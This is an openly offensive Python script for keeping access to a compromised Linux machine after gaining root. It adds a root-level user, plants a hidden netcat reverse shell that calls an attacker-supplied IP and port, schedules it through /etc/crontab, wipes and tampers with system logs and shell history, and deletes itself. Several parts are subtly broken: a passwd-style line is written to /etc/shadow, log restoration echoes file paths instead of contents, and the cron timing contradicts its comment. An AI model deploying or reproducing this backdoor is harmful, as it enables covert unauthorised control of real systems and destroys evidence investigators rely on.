#!/usr/bin/python3
# author: suffs811
# github: https://github.com/cysec11/scripts.git
# purpose: script for establishing persistence on root-compromised linux machine (adding new root user and backdoor beacon on target box)
# 
# usage: python3 pers.py -u 'pepe' -p 'password' 10.0.0.1 4444


import os
import argparse


parser = argparse.ArgumentParser(description="script for adding new root user and creating callback to local machine\nusage: pers.py -u 'pepe' -p 'password' 10.0.0.1 4444")
parser.add_argument("-u", "--user", help="username for new root user", required=True)
parser.add_argument("-p", "--password", help="password for new root user", required=True)
parser.add_argument("-f", "--force", help="force bypass of root permissions check", required=False, action="store_true")
parser.add_argument("ip", help="local ip for callback")
parser.add_argument("port", help="local port for callback")
args = parser.parse_args()
username = args.user
password = args.password
local_ip = args.ip
local_port = args.port


# create backup of logs to reestablish them when finished
def disable_hist():
	print("\n### creating backups of log files... ###")
	os.system("mkdir /tmp/.backups")
	os.system("cp /var/log/auth.log /tmp/.backups/")
	os.system("cp /var/log/cron.log /tmp/.backups/")
	os.system("cp /var/log/maillog /tmp/.backups/")
	os.system("cp /var/log/httpd /tmp/.backups/")
	os.system("cp ~/.bash_history /tmp/.backups/")
	os.system("cp /root/.bash_history /tmp/.backups/")
	os.system("echo $history > /tmp/.backups/history")
	os.system("history -c")
	os.system("history -w")


# check for root permissions
os.system("whoami | tee /tmp/whoami.txt")


def perm_check():
	with open("/tmp/whoami.txt") as who_file:
		who = who_file.readlines()[-1].strip()
		if who == "root":
			return True
		else:
			print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
			return False


# call function to check for root permissions
is_root = perm_check()


# add user with root perms
def add_user(username,password):
	if username:
		print("establishing persistence...")
		os.system("openssl passwd -6 {} > /tmp/.backups/passwd.txt".format(password))
		f = open("/tmp/.backups/passwd.txt", "r")
		new_user_pass = f.read().strip()
		os.system("echo '{}:{}:0:0:root:/{}:/bin/bash' >> /etc/shadow".format(username,new_user_pass,username))
		print("user {} added".format(username))
		f.close()
	else:
		print("\n*** error: username not specified: use -u to specify username ***")
		return


# create script for nc rev shell callback
def callback(local_ip, local_port, username, password):
	try:
		print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
		os.system("mkdir /dev/shm/.data")
		os.system("touch /dev/shm/.data/data-log.sh")
		os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
		os.system("chown {} /dev/shm/.data/".format(username))
		os.system("echo {} | sudo su root1".format(password))
		os.system("chmod 100 /dev/shm/.data/data-log.sh")
		os.system("chmod 700 /dev/shm/.data/")
		print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
		#os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
	except:
		print("\n*** error: couldn't create callback script. netcat might not exist on machine, uncomment two lines above for bash rev shell ***")

# create cronjob for executing callback script every 5 min
def cron_make():
	try:
		print("\n### creating cronjob to execute callback every 5 min... ###")
		os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")
		print("\n### cronjob created ###")
	except:
		print("\n*** error: couldn't create cronjob, try manually making one with '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' ***")

# cover tracks and reestablish history logging
def clear_tracks():
	print("\n### clearing log files ###")
	os.system("echo ' ' > /var/log/auth.log")
	os.system("echo ' ' > /var/log/cron.log")
	os.system("echo ' ' > /var/log/maillog")
	os.system("echo ' ' > /var/log/httpd")
	os.system("history -c")
	os.system("history -w")
	os.system("echo ' ' > ~/.bash_history")
	os.system("echo ' ' > /root/.bash_history")

	# placing old contents back into logs
	os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
	os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
	os.system("echo /tmp/.backups/maillog > /var/log/maillog")
	os.system("echo /tmp/.backups/httpd > /var/log/httpd")
	os.system("echo /tmp/.backups/.bash_history > ~/.bash_history")
	os.system("echo /tmp/.backups/.bash_history > /root/.bash_history")
	os.system("echo /tmp/.backups/history > $history")

	print("\n### deleting data file and script... ###")
	os.system("rm -rf /tmp/.backups")
	os.system("rm -f /tmp/whoami.txt")
	os.system("rm -f pers.py")


# call functions
if is_root or args.force:
	disable_hist()
	add_user(username, password)
	callback(local_ip, local_port, username, password)
	cron_make()
	clear_tracks()
	
